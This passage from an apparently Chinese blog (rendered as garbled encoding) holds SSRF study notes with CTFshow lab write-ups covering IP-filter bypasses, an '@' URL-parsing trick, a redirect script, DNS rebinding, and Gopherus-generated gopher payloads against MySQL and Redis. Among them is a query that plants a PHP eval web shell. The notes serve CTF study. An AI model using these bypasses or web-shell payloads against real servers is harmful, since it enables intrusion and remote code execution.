<h4 id="ç›¸å…³è¿‡æ»¤å™¨"><a href="#ç›¸å…³è¿‡æ»¤å™¨" class="headerlink" title="ç›¸å…³è¿‡æ»¤å™¨"></a>ç›¸å…³è¿‡æ»¤å™¨</h4><table>
<thead>
<tr>
<th><a target="_blank" rel="noopener" href="https://www.runoob.com/php/filter-validate-ip.html">FILTER_VALIDATE_IP</a></th>
<th>æŠŠå€¼ä½œä¸º IP åœ°å€æ¥éªŒè¯ï¼Œåªé™ IPv4 æˆ– IPv6 æˆ– ä¸æ˜¯æ¥è‡ªç§æœ‰æˆ–è€…ä¿ç•™çš„èŒƒå›´ã€‚</th>
</tr>
</thead>
</table>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416084453141.png" alt="image-20250416084453141"></p>
<p>æ‰€ä»¥å¯çŸ¥ï¼Œè¦æ±‚ipä¸åœ¨ RFC æŒ‡å®šçš„ç§æœ‰èŒƒå›´IPå†…ï¼ˆæ¯”å¦‚ 192.168.0.1ï¼‰ï¼Œä¹Ÿä¸åœ¨ä¿ç•™çš„IPèŒƒå›´å†…ã€‚</p>
<table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>èŒƒå›´</th>
<th>ä¸ºä»€ä¹ˆè¢«é™åˆ¶ï¼Ÿ</th>
</tr>
</thead>
<tbody><tr>
<td>ç§æœ‰åœ°å€</td>
<td><code>10.</code>, <code>172.16-31.</code>, <code>192.168.</code></td>
<td>å†…ç½‘åœ°å€ï¼Œä¸èƒ½è®©ç”¨æˆ·æ¢æµ‹</td>
</tr>
<tr>
<td>ä¿ç•™åœ°å€</td>
<td><code>127.</code>, <code>169.254.</code>, <code>224.</code>, <code>240.</code>, <code>255.</code></td>
<td>æœ‰ç‰¹æ®Šå«ä¹‰&#x2F;ä¸å…è®¸å¤–éƒ¨é€šä¿¡</td>
</tr>
</tbody></table>
<p>ä»¥ä¸‹ä¸¤ç§æ–¹æ³•å®æ“å¯è§æœ€ä¸‹æ–¹çš„bypassæ€»ç»“ä¸­ã€‚</p>
<p><strong>method1 å…¬ç½‘æŒ‚é©¬</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/Quicker_20250416_091903.png" alt="Quicker_20250416_091903"></p>
<p><strong>method2 DNSé‡ç»‘å®š</strong></p>
<p>å¸¸ç”¨å·¥å…·<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service</a></p>
<p>æ„é€ æ°å½“çš„URLï¼Œä¾‹å¦‚ç”¨googleï¼Œbaiduè¿™äº›å®˜ç½‘çš„dnsè§£æipæ¥è¿›è¡Œäº¤æ›¿ï¼ˆping å¯ä»¥æŸ¥çœ‹ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°DNSè§£æåœ¨ä¸æ–­å˜æ¢ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416102926004.png" alt="image-20250416102926004"></p>
<p>æ²¡æˆåŠŸçš„è¯ï¼Œå¤šåˆ·æ–°å‡ æ¬¡ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416105222070.png" alt="image-20250416105222070"></p>
<h3 id="web358-ç»•è¿‡"><a href="#web358-ç»•è¿‡" class="headerlink" title="web358 @ç»•è¿‡"></a>web358 @ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>éœ€è¦åŒ¹é…æ­£åˆ™è¡¨è¾¾ï¼Œæ»¡è¶³<code>http://ctf.</code>å¼€å¤´ï¼Œ<code>show</code>ç»“å°¾ï¼Œè€Œä¸”èƒ½è§£æã€‚</p>
<p>æ„é€ å¦‚ä¸‹ï¼š</p>
<p><a target="_blank" rel="noopener" href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a></p>
<p>åˆ©ç”¨å‚æ•°æŸ¥è¯¢<code>?</code>ï¼Œæˆ–è€…é”šç‚¹<code>#</code>ç»•è¿‡show</p>
<p>åœ¨Parse_urlå‡½æ•°ä¸­æˆ‘ä»¬æåˆ°è¿‡ï¼Œè¯¥å‡½æ•°ä¼šæŠŠ@å‰ååˆ†æ®µå¼€ï¼Œåˆ†ä¸º:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[host] =&gt; hostname			<span class="comment">//@å</span></span><br><span class="line">[user] =&gt; username			<span class="comment">//@å‰</span></span><br><span class="line">[pass] =&gt; password			<span class="comment">//@å‰</span></span><br></pre></td></tr></table></figure>

<p>äºæ˜¯å®ƒå®é™…è§£æçš„ä»ç„¶æ˜¯æŒ‡å‘127.0.0.1çš„ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416112945370.png" alt="image-20250416112945370"></p>
<h3 id="web359-Gopheræ‰“æ— å¯†ç çš„mysql"><a href="#web359-Gopheræ‰“æ— å¯†ç çš„mysql" class="headerlink" title="web359 Gopheræ‰“æ— å¯†ç çš„mysql"></a>web359 Gopheræ‰“æ— å¯†ç çš„mysql</h3><p>è¿›æ¥ä¸€ä¸ªç™»å½•æ¡†ï¼ŒæŠ“åŒ…å‘ç°æœ‰ä¸€ä¸ªreturlå‚æ•°ï¼Œ</p>
<p>éœ€è¦ä¸‹è½½ä¸€ä¸ªç”Ÿæˆgopheråè®®çš„payloadå·¥å…·ï¼š<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
<p>usageï¼š<code>python2 gopherus.py --exploit mysql</code></p>
<p>ç”¨æˆ·ä¸ºroot,queryä¸º <code>select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/shell.php&#39;;</code></p>
<p>å¹¶ä¸”å°†ç”Ÿæˆçš„payloadå†æ¬¡è¿›è¡Œurlç¼–ç ï¼Œå› ä¸ºè§£ææ—¶ä¼šè§£å¯†ä¸€å±‚ã€‚</p>
<p>æ›¿æ¢åˆ°returlå‚æ•°çš„å€¼åå‘åŒ…ï¼Œç„¶åèšå‰‘è¿æ¥å³å¯ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416193201139.png" alt="image-20250416193201139"></p>
<h3 id="web360-Gopheråè®®æ‰“redis"><a href="#web360-Gopheråè®®æ‰“redis" class="headerlink" title="web360 Gopheråè®®æ‰“redis"></a>web360 Gopheråè®®æ‰“redis</h3><p>hintï¼šæ‰“redis</p>
<p>åŒä¸Šé¢˜ä¸€æ ·ï¼Œæ¢ä¸ªpayloadï¼Œusageï¼š<code>python2 gopherus.py --exploit redis</code></p>
<p>æ“ä½œä¸€æ ·ï¼Œæœ€å</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250416194828764.png" alt="image-20250416194828764"></p>
<h2 id="åˆ·é¢˜ä¹‹åçš„bypassæ€»ç»“"><a href="#åˆ·é¢˜ä¹‹åçš„bypassæ€»ç»“" class="headerlink" title="åˆ·é¢˜ä¹‹åçš„bypassæ€»ç»“"></a>åˆ·é¢˜ä¹‹åçš„bypassæ€»ç»“</h2><h3 id="å­—ç¬¦ç»•è¿‡"><a href="#å­—ç¬¦ç»•è¿‡" class="headerlink" title="å­—ç¬¦ç»•è¿‡"></a>å­—ç¬¦ç»•è¿‡</h3><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">è¿›åˆ¶ç»•è¿‡ 		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0x7F000001/flag.php</span></span><br><span class="line"><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>ç»•è¿‡		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0.0.0.0/flag.php</span></span><br><span class="line">ç‰¹æ®Šçš„åœ°å€<span class="number">0</span>ï¼Œ		<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//0/flag.php </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç¬¬ä¸€ä¸ª 0 åœ¨linuxç³»ç»Ÿä¸­ä¸€èˆ¬ä¼šè§£ææˆ127.0.0.1 ï¼Œåœ¨windows å’Œ macos ä¸­ä¸€èˆ¬è§£ææˆ0.0.0.0</span></span><br><span class="line"></span><br><span class="line">è¿˜æœ‰			<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127.1/flag.php //å¯çœç•¥0</span></span><br><span class="line">è¿˜æœ‰			<span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127.0000000000000.001/flag.php</span></span><br><span class="line">ç‰¹æ®Šå­—ç¬¦       <span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//â‘ â‘¡â‘¦.â“ª.â“ª.â‘ /flag.php</span></span><br><span class="line">ç”¨ä¸­æ–‡å¥å·ç»•è¿‡  <span class="built_in">url</span>=<span class="attribute">http</span>:<span class="comment">//127ã€‚0ã€‚0ã€‚1/</span></span><br></pre></td></tr></table></figure>

<h3 id="å…¬ç½‘æŒ‚é©¬"><a href="#å…¬ç½‘æŒ‚é©¬" class="headerlink" title="å…¬ç½‘æŒ‚é©¬"></a>å…¬ç½‘æŒ‚é©¬</h3><p>æ‰“é‡å®šå‘</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ®µ PHP è„šæœ¬çš„ä½œç”¨æ˜¯ï¼š</p>
<ul>
<li><p>å½“æŸä¸ªç›®æ ‡æœåŠ¡å™¨è®¿é—®ä½ çš„å…¬ç½‘æœåŠ¡æ—¶ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-public-ip:port/malicious.php</span><br></pre></td></tr></table></figure>
</li>
<li><p>å®ƒä¼šè¿”å›ä¸€ä¸ª HTTP é‡å®šå‘ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
</li>
<li><p>äºæ˜¯ï¼Œ<strong>å¦‚æœç›®æ ‡æœåŠ¡å™¨è‡ªåŠ¨è·Ÿéšé‡å®šå‘</strong>ï¼Œå®ƒä¼š**è½¬å¤´è¯·æ±‚è‡ªå·±çš„ <code>127.0.0.1/flag.php</code>**ã€‚</p>
</li>
</ul>
<h3 id="DNSé‡ç»‘å®š"><a href="#DNSé‡ç»‘å®š" class="headerlink" title="DNSé‡ç»‘å®š"></a>DNSé‡ç»‘å®š</h3><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://bblog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/04.SSRF/01.DNS%E9%87%8D%E7%BB%91%E5%AE%9A.html">01.DNSé‡ç»‘å®š Â· d4m1ts çŸ¥è¯†åº“</a></p>
<p>å¸¸ç”¨å·¥å…·<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service</a></p>
<p>æŒ‡æ”»å‡»è€…é€šè¿‡DNSæœåŠ¡å™¨å°†åŸŸåè§£æåˆ°æ¶æ„IPåœ°å€ï¼Œç„¶åå†å°†å…¶è§£æåˆ°åˆæ³•IPåœ°å€ï¼Œä»è€Œç»•è¿‡åç«¯çš„å®‰å…¨æ£€æŸ¥ã€‚<strong>å…¶æœ¬è´¨å°±æ˜¯æ¬ºéª—å®¢æˆ·ç«¯è¯·æ±‚çš„IPåœ°å€ã€‚</strong></p>
<p>çœ‹ç½‘ä¸Šçš„æ–‡ç« æ„Ÿè§‰ä¸æ˜¯å¾ˆå½¢è±¡ï¼Œä½†GPTçš„è®²è§£å¾ˆé€šé€ï¼Œæˆ‘åœ¨è¿™é‡Œè´´ä¸€ä¸‹ï¼š</p>
<blockquote>
<h2 id="ğŸ’¡-å®æˆ˜åœºæ™¯ä¸¾ä¸ªä¾‹å­"><a href="#ğŸ’¡-å®æˆ˜åœºæ™¯ä¸¾ä¸ªä¾‹å­" class="headerlink" title="ğŸ’¡ å®æˆ˜åœºæ™¯ä¸¾ä¸ªä¾‹å­"></a>ğŸ’¡ å®æˆ˜åœºæ™¯ä¸¾ä¸ªä¾‹å­</h2><p>è®¾æƒ³æœ‰ä¸€ä¸ªç½‘ç«™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /fetch?url=http://example.com</span><br></pre></td></tr></table></figure>

<p>å®ƒä¼šè¯·æ±‚ä½ ä¼ çš„ <code>url</code>ï¼Œä½†æœ‰å¦‚ä¸‹é™åˆ¶ï¼š</p>
<ul>
<li>âŒ ç¦æ­¢ IP æ˜¯ <code>127.0.0.1</code></li>
<li>âœ… å…è®¸ä½ å¡«å…¥åŸŸåï¼Œä¾‹å¦‚ <code>evil.rbndr.us</code></li>
</ul>
<p>ä½ è®¾ç½® <code>evil.rbndr.us</code> è¿™ä¸ªåŸŸåï¼š</p>
<ul>
<li><strong>ç¬¬ä¸€æ¬¡è§£æï¼šæŒ‡å‘ä½ çš„æœåŠ¡å™¨ï¼ˆå…¬ç½‘ IPï¼‰</strong></li>
<li>**ç¬¬äºŒæ¬¡è§£æï¼šå˜æˆ <code>127.0.0.1</code> æˆ– <code>169.254.169.254</code>**ï¼</li>
</ul>
<p>äºæ˜¯ SSRF è®¿é—®ä½ çš„åŸŸå â†’ å…¶å®æ‰“åˆ°äº† <strong>ç›®æ ‡çš„å†…ç½‘æœåŠ¡</strong>ã€‚</p>
<h2 id="ğŸ§ -è¯¦ç»†è¿‡ç¨‹"><a href="#ğŸ§ -è¯¦ç»†è¿‡ç¨‹" class="headerlink" title="ğŸ§  è¯¦ç»†è¿‡ç¨‹"></a>ğŸ§  è¯¦ç»†è¿‡ç¨‹</h2><ol>
<li>SSRF å‘è¯·æ±‚ï¼š<code>http://evil.rbndr.us</code></li>
<li>DNS è§£æ <code>evil.rbndr.us</code>ï¼Œç¬¬ä¸€æ¬¡è§£æç»“æœæ˜¯ä½ çš„å…¬ç½‘ IP</li>
<li>ç›®æ ‡æœåŠ¡è¯·æ±‚äº†ä½ æœåŠ¡å™¨ï¼ˆä½ æ§åˆ¶ï¼‰</li>
<li>ä½ æœåŠ¡å™¨<strong>ä»€ä¹ˆä¹Ÿä¸è¿”å›ï¼ŒæŒ‚ç€ä¸å¤„ç†</strong></li>
<li>ç­‰ DNS ç¼“å­˜è¿‡æœŸåï¼ˆå‡ ç§’ï¼‰</li>
<li>å†æ¬¡è§£æ <code>evil.rbndr.us</code> â†’ <strong>å˜æˆ <code>127.0.0.1</code></strong></li>
<li>SSRF ç»§ç»­è·Ÿéšè¯·æ±‚ï¼šè®¿é—® <code>http://127.0.0.1</code></li>
</ol>
<p>ğŸ’¥ æˆåŠŸ SSRF æ‰“åˆ°äº†å†…ç½‘ï¼</p>
</blockquote>
<h3 id="Gopherusä½¿ç”¨"><a href="#Gopherusä½¿ç”¨" class="headerlink" title="Gopherusä½¿ç”¨"></a>Gopherusä½¿ç”¨</h3><ol>
<li><p>å®‰è£…</p>
 <figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/tarunkant/Gopherus.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>payloadæ”¯æŒ:</p>
<ul>
<li>MySQL æœ‰æ•ˆè´Ÿè½½</li>
<li>FastCGI æœ‰æ•ˆè´Ÿè½½</li>
<li>Memcached æœ‰æ•ˆè´Ÿè½½</li>
<li>Redis æœ‰æ•ˆè´Ÿè½½</li>
<li>Zabbix æœ‰æ•ˆè½½è·</li>
<li>SMTP æœ‰æ•ˆè´Ÿè½½</li>
</ul>
</li>
<li><p>ä»¥æ— å¯†ç mysqlä¸ºä¾‹ï¼š</p>
<p> usageï¼š<code>python2 gopherus.py --exploit mysql</code></p>
<p> ç”¨æˆ·ä¸º<code>root</code>ï¼Œqueryä¸º <code>select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/shell.php&#39;;</code></p>
</li>
</ol>
<h2 id="å…³äºGopheråè®®ä¸ºä»€ä¹ˆåé¢è¦æœ‰ä¸€ä¸ª"><a href="#å…³äºGopheråè®®ä¸ºä»€ä¹ˆåé¢è¦æœ‰ä¸€ä¸ª" class="headerlink" title="å…³äºGopheråè®®ä¸ºä»€ä¹ˆåé¢è¦æœ‰ä¸€ä¸ª_?"></a>å…³äºGopheråè®®ä¸ºä»€ä¹ˆåé¢è¦æœ‰ä¸€ä¸ª<code>_</code>?</h2><p>è¿™é‡Œè´´ä¸€ä¸‹<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Y0uhe/p/15837670.html">CTFSHOW-SSRFç¯‡ - LinkPoc - åšå®¢å›­</a>è¿™ç¯‡åšå®¢ä¸­çš„ä¸€å¼ å›¾ç‰‡ï¼š<br><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/2289942-20220124211658010-532695203.png" alt="img"></p>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRFæ¼æ´åŸç†æ”»å‡»ä¸é˜²å¾¡(è¶…è¯¦ç»†æ€»ç»“)-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333318.html">ä»0åˆ°1å®Œå…¨æŒæ¡ SSRF - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/rpup/p/18100622">CSRF ä¸SSRFåŸºç¡€ åŠctfshow ç»ƒä¹  - æŠ˜ç¿¼çš„å°é¸Ÿå…ˆç”Ÿ - åšå®¢å›­</a></p>
<p><a target="_blank" rel="noopener" href="https://nanian-233.github.io/posts/ssrf.html#%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87">SSRF | Nanian233ğŸŠâ€™s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/140337605">SSRFæ¼æ´æ·±å…¥åˆ©ç”¨ä¸é˜²å¾¡æ–¹æ¡ˆç»•è¿‡æŠ€å·§_ssrfç»•è¿‡-CSDNåšå®¢</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">é¦–é¡µ</a></li>
        
          <li><a href="/about/">å…³äº</a></li>
        
          <li><a href="/archives/">å½’æ¡£</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">é¡¹ç›®</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF-Server-Side-Request-Forgery-%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">SSRF(Server-Side Request Forgery)æ¦‚è¿°</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%A2%E6%88%90%E5%8E%9F%E7%90%86%E5%8F%8A%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.1.</span> <span class="toc-text">å½¢æˆåŸç†åŠå±å®³</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">åˆ©ç”¨æ–¹å¼</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">PHPä¸­ä¸€äº›å…³é”®å‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.2.</span> <span class="toc-text">ä¼ªåè®®</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file-%EF%BC%88%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%EF%BC%89"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">file:&#x2F;&#x2F;ï¼ˆè®¿é—®æœ¬åœ°æ–‡ä»¶ï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dict-%EF%BC%88%E6%9F%A5%E8%AF%A2%E5%AD%97%E5%85%B8%E6%9C%8D%E5%8A%A1%EF%BC%89"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">dict:&#x2F;&#x2F;ï¼ˆæŸ¥è¯¢å­—å…¸æœåŠ¡ï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ftp-%EF%BC%88%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E8%B5%84%E6%BA%90%EF%BC%89"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">ftp:&#x2F;&#x2F;ï¼ˆè®¿é—®è¿œç¨‹æ–‡ä»¶èµ„æºï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#data-%EF%BC%88%E5%B5%8C%E5%85%A5%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">data:&#x2F;&#x2F;ï¼ˆåµŒå…¥æ•°æ®ï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gopher"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">gopher:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Parse-url%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text">Parse_urlå‡½æ•°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8Payload"><span class="toc-number">1.2.4.</span> <span class="toc-text">å¸¸ç”¨Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%9B%9E%E9%A1%BE"><span class="toc-number">1.3.</span> <span class="toc-text">é¢˜ç›®å›é¡¾</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ImageCloud%E5%89%8D%E7%BD%AE"><span class="toc-number">1.3.1.</span> <span class="toc-text">ImageCloudå‰ç½®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ImageCloud"><span class="toc-number">1.3.2.</span> <span class="toc-text">ImageCloud</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFshow%E5%88%B7%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text">CTFshowåˆ·é¢˜</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web352"><span class="toc-number">1.4.1.</span> <span class="toc-text">web352</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web353"><span class="toc-number">1.4.2.</span> <span class="toc-text">web353</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web354-%E5%85%AC%E5%85%B1%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.3.</span> <span class="toc-text">web354 å…¬å…±è§£æåŸŸåç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web355-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B61"><span class="toc-number">1.4.4.</span> <span class="toc-text">web355 é•¿åº¦é™åˆ¶1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web356-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B62"><span class="toc-number">1.4.5.</span> <span class="toc-text">web356 é•¿åº¦é™åˆ¶2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web357-%E5%86%85%E7%BD%91IP%E8%BF%87%E6%BB%A4"><span class="toc-number">1.4.6.</span> <span class="toc-text">web357 å†…ç½‘IPè¿‡æ»¤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#filter-var-%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.6.1.</span> <span class="toc-text">filter_var() å‡½æ•°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.4.6.2.</span> <span class="toc-text">ç›¸å…³è¿‡æ»¤å™¨</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web358-%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.7.</span> <span class="toc-text">web358 @ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web359-Gopher%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81%E7%9A%84mysql"><span class="toc-number">1.4.8.</span> <span class="toc-text">web359 Gopheræ‰“æ— å¯†ç çš„mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web360-Gopher%E5%8D%8F%E8%AE%AE%E6%89%93redis"><span class="toc-number">1.4.9.</span> <span class="toc-text">web360 Gopheråè®®æ‰“redis</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%B7%E9%A2%98%E4%B9%8B%E5%90%8E%E7%9A%84bypass%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">åˆ·é¢˜ä¹‹åçš„bypassæ€»ç»“</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.1.</span> <span class="toc-text">å­—ç¬¦ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AC%E7%BD%91%E6%8C%82%E9%A9%AC"><span class="toc-number">1.5.2.</span> <span class="toc-text">å…¬ç½‘æŒ‚é©¬</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">1.5.3.</span> <span class="toc-text">DNSé‡ç»‘å®š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%A1-%E5%AE%9E%E6%88%98%E5%9C%BA%E6%99%AF%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="toc-number">1.6.</span> <span class="toc-text">ğŸ’¡ å®æˆ˜åœºæ™¯ä¸¾ä¸ªä¾‹å­</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B"><span class="toc-number">1.7.</span> <span class="toc-text">ğŸ§  è¯¦ç»†è¿‡ç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gopherus%E4%BD%BF%E7%94%A8"><span class="toc-number">1.7.1.</span> <span class="toc-text">Gopherusä½¿ç”¨</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EGopher%E5%8D%8F%E8%AE%AE%E4%B8%BA%E4%BB%80%E4%B9%88%E5%90%8E%E9%9D%A2%E8%A6%81%E6%9C%89%E4%B8%80%E4%B8%AA"><span class="toc-number">1.8.</span> <span 